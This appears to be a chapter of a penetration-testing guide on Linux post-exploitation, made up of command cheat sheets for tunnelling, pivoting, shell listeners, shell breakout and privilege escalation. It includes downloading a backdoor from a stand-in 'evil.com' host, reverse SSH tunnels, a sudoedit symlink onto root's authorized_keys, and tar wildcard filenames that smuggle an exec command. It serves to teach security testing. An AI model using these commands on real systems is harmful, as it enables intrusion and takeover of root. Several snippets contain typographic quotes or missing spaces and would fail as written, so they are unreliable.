# Chapter 5 - Linux Post-Exploitation

> _Unplug the network cable and instantiate draconian measures for physical security, You’ll make sure nobody can get in, but you’ll also make sure that nobody actually wants to use the platform. And that may sound like an extreme case, but it’s a very fundamental issue in security. You cannot look at security as something separate. Security issues are ‘just’ normal bugs_
>
> _**— **_**Linus Torvald**

This is the phase I like to refer to as second pass enumeration or enumeration from the inside. Now that we've gained a foothold into the network it is crucial to run all of our enumeration from the ground up as an inside actor.

##### Resources

[The Linux Programming Interface](https://moodle2.units.it/pluginfile.php/115306/mod_resource/content/1/The Linux Programming Interface-Michael Kerrisk.pdf)

[DirtyCow](https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs)

[kernel-exploits - GitHub](https://github.com/xairy/kernel-exploits)

[Linux Kernel Exploits - GitHub](https://github.com/SecWiki/linux-kernel-exploits)

[Basic Linux Privilege Escalation - g0tm1lk](http://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)

[UNIX PrivEsc Check](https://github.com/pentestmonkey/unix-privesc-check)

[LinEnum](https://github.com/rebootuser/LinEnum)

[linuxprivchecker.py](https://gist.github.com/sh1n0b1/e2e1a5f63fbec3706123)

[Linux PrivEsc for fun and profit and all around mischief](https://www.youtube.com/watch?v=dk2wsyFiosg)

[A PenTester's Guide to Pivoting](http://hackingandsecurity.blogspot.com/2017/10/a-red-teamers-guide-to-pivoting.html)

[Understanding systemd](https://n0where.net/understanding-systemd/)

##### Listing Packages

```
Kali> dpkg -l
Kali> rpm -qa
```

##### Uploading Files

```
Kali> wget http://evil.com/backdoor.py
Kali> curl http://evil.com/backdoor.py
Kali> scp ~/backdoor.py user@$TARGET:tmp/backdoor.py
```

##### Port Redirection

> ###### rinetd

```
rinetd

vi /etc/rinetd.conf
# bind        # port        # connect        # port
a.b.c.d     53             e.f.g.h         80
```

##### SSH

> ###### Generate key

```
Kali> ssh-keygen -t rsa
```

> ###### SSH with Key

```
Kali> ssh -i key_file user@host
```

> ###### SSH Tunneling

```
# Local Tunnel
Kali> ssh $ATTACKER -L 3000:$TARGET:2222

# Remote Tunnel
Kali> ssh $TARGET -R 2222:localhost:3000

# Dynamic Tunnel to $TARGET
Kali> ssh -D 127.0.0.1:3000 -N username@$TARGET
```

> ###### tgcd tunneling

```
Kali> tgcd -L -p 9999 -q 40000
Kali> tgcd -C -s IP:9999 -c ATTACKER:40000
Kali> iptables -t nat -A OUTPUT -d IP -j DNAT --to-destination 127.0.0.1
```

##### HTTP Tunneling

```
Kali> nc -vvn $TARGET 8888
CONNECT $TARGET2:80 HTTP/1.0
```

##### Proxychains

```
# create reverse ssh tunnel on our target
Kali> ssh -f -N -R 2222:127.0.0.1:22 root@$ATTACKER

# create on our attacking machine
Kali> ssh -f -N -D 127.0.0.1:8080 -p 2222

# Good to go
Kali> proxychains nmap -sV $TARGET
```

##### Networking

```
# Set IP

Kali> ifconfig eth0 xxx.xxx.xxx.xxx/24


# Calculate subnet

Kali> ipcalc xxx.xxx.xxx.xxx/24


# Bring devices up/down

Kali> ifconfig eth0 up
Kali> ifconfig eth0 down


# Get IP from DHCP

Kali> dhclient


# Log traffic for ICMP packets

Kali> tcpdump -i tun0 icmp


# Test from remote box

Kali> ping $ATTACKER -c 3
```

##### Listen for Shell

> ###### Resources

[Reverse Shell Cheat Sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

> ###### TCP

```
Kali> nc -vlnp 54321
```

> ###### UDP

    Kali> socat file:`tty`,echo=0,raw udp-listen:54321

##### Start a simple HTTP server

```
Kali> python -m SimpleHTTPServer 80
Kali> python3 -m http.server
Kali> ruby -r webrick -e "WEBrick::HTTPServer.new(:Port => 80, :DocumentRoot => Dir.pwd).start"
Kali> php -S 0.0.0.0:80
```

##### Bash Foo

> ###### bin2shellcode

```
function bin2sc {
    hexdump -v -e '"\\""x" 1/1 "%02x" ""'${1}
}
```

> ###### Scan for string in all files in a directory

```
Kali> du . | awk '{print $2}'| grep -rnw "string" --color
```

> ###### Convert file contents to lowercase

```
Kali> tr '[:upper:]' '[:lower:]'< inputfile
```

> ###### Simple for loop

    Kali> for i in`seq 10 20`;do this;done

> ###### Remove last byte from a file

```
Kali> truncate -s -1 filename
```

> ###### Hijack full path to a binary for current pts

```
Kali> function/usr/bin/foo () { /usr/bin/echo "It works"; }
Kali> export -f /usr/bin/foo
```

> ###### Use Env to force scripts to run a different command

```
Kali> ln -s /usr/bin/nano cat
Kali> export PATH=.:$PATH
```

##### Port Knocking

```
Kali> for x in port1 port2 port3;do nmap -Pn --host_timeout 201 --max-retries -p $x $TARGET;done
Kali> nc -z $TARGET port1 port2 port3;
```

##### Breakout Shell

> ###### Resources

[Escape from Shellcatraz: Breaking out of restricted UNIX shells](https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells)

```
Kali> awk ‘BEGIN {system(“/bin/bash”)}’
Kali> python -c ‘import pty; pty.spawn(“/bin/bash”)’
Kali> echo os.system(‘/bin/bash’);
Kali> /bin/sh -i
```

##### Upgrade Shell

> ###### Netcat

```
# Background current shell: CTRL + Z

Kali> stty raw -echo
Kali> fg
```

> ###### Resources

[Upgrading Simple shells to fully interactive TTYs](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)

##### Insecure Sudo

```
Kali> sudo -l
```

##### Finding gems on the file system

```
# Find commands for SUID or SGID
Kali> find / -perm -g=s -type f 2>/dev/null
Kali> find / -perm -u=s -type f 2>/dev/null

# Find commands for writable/executable directories
Kali> find / -writable -type d 2>/dev/null
Kali> find / -perm -o w -type d 2>/dev/null
Kali> find / -perm -o x -type d 2>/dev/null

# Sometimes a quick bit of information can be helpful
# Especially if you get access denied when you try to run a command
# Such as iptables -L
Kali> locate iptables

# Locate useful files like gcc, wget, etc
Kali> locate gcc

# Take advantage of wildcard searching
# This is only a base example of what you can do
# I use this technique often to find random things hidden deep in the file system
Kali> ls /*/*/*/*.conf

# Be creative
Kali> cat /etc/cron.*/* | grep SEARCHSTRING

# Mix it up
Kali> find / -type f -name '*.conf' | xargs grep -rnw -3 "Password" 2>/dev/null
```

##### Unmounted drives

```
Kali> cat /etc/fstab
Kali> mount
```

##### Exim

```
Kali> exim -bV -v | grep -i Perl
```

##### Wildcard Manipulation

> ###### Resources

[UNIX Wildcards gone wild](https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt)

> ###### Sudoedit

```
# if sudoedit is using wildcards you can escape out with a few techniques
# Such as:  (root) NOPASSWD: sudoedit /var/www/*/*/file.html
Kali> ln -s /root/.ssh/authorized_keys /var/www/testing/testdir/file.html
# Now when you add your key to this file, you will be able to login to root, for example
```

> ###### Tar

```
# If there is a script running as an authorized user that uses wildcards to tar a folder, you can inject command line arguments via:
Kali> echo '' > "--checkpoint-action=exec='sh shell.sh'"
Kali> echo '' > "--checkpoint=1"
```



